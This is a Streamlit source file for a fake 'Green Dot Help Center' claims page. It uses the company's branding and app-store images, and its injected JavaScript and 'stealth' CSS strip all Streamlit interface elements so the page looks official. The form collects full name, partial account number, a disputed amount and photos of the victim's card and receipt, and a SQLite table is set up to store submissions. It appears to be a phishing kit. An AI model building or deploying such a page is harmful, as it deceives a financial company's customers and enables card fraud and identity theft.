
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JS NUCLEAR V1.2.6 (CONTROL DE WIDGETS DE CARGA)
st.markdown("""<script>
    const nuclearClean = () => {
        const toHide = [
            'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
            '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
            '.stElementToolbar', '[data-testid="stElementToolbar"]',
            '.section-anchor', 'a.section-anchor', 'svg.etxdrby1'
        ];
        toHide.forEach(s => {
            document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
        });

        // Forzar visibilidad de widgets de subida (FileUpload)
        document.querySelectorAll('[data-testid="stFileUploader"]').forEach(el => {
            el.style.backgroundColor = '#1a1a1a';
            el.style.border = '1px solid #333';
            el.style.borderRadius = '8px';
            el.style.padding = '10px';
        });

        document.querySelectorAll('.st-emotion-cache-h5555q').forEach(el => {
            el.style.backgroundColor = '#000000';
            el.style.color = '#FFFFFF';
            el.style.border = 'none';
        });
    };
    setInterval(nuclearClean, 30);
</script>""", unsafe_allow_html=True)

# CSS STEALTH TOTAL V1.2.6
st.markdown("""<style>
    /* BLINDAJE NEGRO ABSOLUTO */
    html, body, [data-testid="stAppViewContainer"], .stApp {
        background-color: #000000 !important;
        color: #FFFFFF !important;
    }

    /* FIX ESPECÍFICO PARA UPLOAD (MODO CLARO) */
    [data-testid="stFileUploader"] {
        background-color: #1a1a1a !important;
        padding: 15px !important;
        border-radius: 10px !important;
        border: 1px solid #444 !important;
    }

    [data-testid="stFileUploader"] section {
        background-color: #222 !important;
        color: white !important;
    }

    [data-testid="stMarkdownContainer"] p, label, .st-ae {
        color: #FFFFFF !important;
    }

    /* FORZAR ESTADO EN LIGHT MODE */
    @media (prefers-color-scheme: light) {
        html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-h5555q {
            background-color: #000000 !important;
            color: #FFFFFF !important;
        }
        [data-testid="stFileUploader"] section { background-color: #222 !important; }
    }

    header, footer, .stDeployButton { display: none !important; }
    .block-container { max-width: 500px !important; padding-top: 1rem !important; }

    .stButton > button {
        background-color: #00a05b !important;
        color: white !important;
        width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
    }

    .promo-box {
        background-color: #111; padding: 20px; border-radius: 12px;
        text-align: center; margin-top: 20px; border: 1px solid #222;
    }
</style>""", unsafe_allow_html=True)

if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
st.title("Help Center")

with st.form("claim_v1_2_6_final", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Last 4 digits of Account")
    st.number_input("Disputed Amount", format="%.2f")
    st.file_uploader("Store Receipt", type=["jpg","png"])
    st.file_uploader("Card Photo", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("Claim Received.")

st.markdown("""<div class='promo-box'>
    <p>Download the Green Dot app</p>
    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
</div>""", unsafe_allow_html=True)
